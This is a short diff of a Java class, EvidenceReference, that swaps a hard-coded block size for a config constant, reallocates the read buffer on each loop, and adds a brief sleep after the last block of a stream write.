@@ -198,7 +198,7 @@ public class EvidenceReference {
 	}
 
 	public void write(DataInputStream is, int length) {
-		int BLOCKSIZE = 65536;
+		int BLOCKSIZE = Cfg.EV_BLOCK_SIZE;
 		byte[] buffer = new byte[BLOCKSIZE];
 		int offset = 0;
 		
@@ -211,7 +211,7 @@ public class EvidenceReference {
 		int size = 0;
 		try {
 			for (;;) {
-
+				buffer = new byte[BLOCKSIZE];
 				int len = is.read(buffer);
 				if(len==-1){
 					if (Cfg.DEBUG) {
@@ -223,6 +223,7 @@ public class EvidenceReference {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (write) last block size: %s", len);
 					}
+					Utils.sleep(100);
 				}else{
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (write) block size: %s %s/%s", len, size, length);
